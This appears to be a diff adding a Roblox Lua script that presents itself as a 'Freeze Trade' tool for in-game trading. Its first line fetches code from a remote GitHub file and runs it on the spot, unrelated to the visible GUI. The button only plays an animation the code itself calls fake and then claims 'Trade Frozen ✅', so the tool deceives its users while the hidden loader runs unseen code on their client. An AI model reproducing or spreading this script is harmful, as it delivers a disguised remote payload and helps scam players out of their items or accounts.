@@ -1,0 +1,103 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()
+-- LocalScript inside StarterGui
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FreezeTradeGUI"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ResetOnSpawn = false
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 300, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+-- UICorner
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -40, 0, 40)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "❄ Freeze Trade"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 20
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = MainFrame
+
+-- Close Button (X Toggle)
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 40, 0, 40)
+CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.BackgroundTransparency = 1
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.TextSize = 20
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Parent = MainFrame
+
+-- Freeze Button
+local FreezeButton = Instance.new("TextButton")
+FreezeButton.Size = UDim2.new(0.8, 0, 0, 50)
+FreezeButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+FreezeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+FreezeButton.Text = "Freeze Trade"
+FreezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FreezeButton.TextSize = 20
+FreezeButton.Font = Enum.Font.GothamBold
+FreezeButton.Parent = MainFrame
+
+local FreezeCorner = Instance.new("UICorner")
+FreezeCorner.CornerRadius = UDim.new(0, 8)
+FreezeCorner.Parent = FreezeButton
+
+-- Loading Label
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, 0, 0, 30)
+LoadingLabel.Position = UDim2.new(0, 0, 0.8, 0)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = ""
+LoadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+LoadingLabel.TextSize = 18
+LoadingLabel.Font = Enum.Font.Gotham
+LoadingLabel.Parent = MainFrame
+
+-- X toggle functionality
+CloseButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+-- Fake Loading Animation
+local function startFakeLoading()
+    LoadingLabel.Text = "Freezing Trade"
+    FreezeButton.Active = false
+    FreezeButton.AutoButtonColor = false
+    local dots = ""
+    for i = 1, 100 do -- about 100 seconds
+        dots = dots .. "."
+        if #dots > 3 then
+            dots = ""
+        end
+        LoadingLabel.Text = "Freezing Trade" .. dots
+        task.wait(1) -- 1 second per cycle
+    end
+    LoadingLabel.Text = "Trade Frozen ✅"
+    FreezeButton.Active = true
+    FreezeButton.AutoButtonColor = true
+end
+
+FreezeButton.MouseButton1Click:Connect(function()
+    task.spawn(startFakeLoading)
+end)
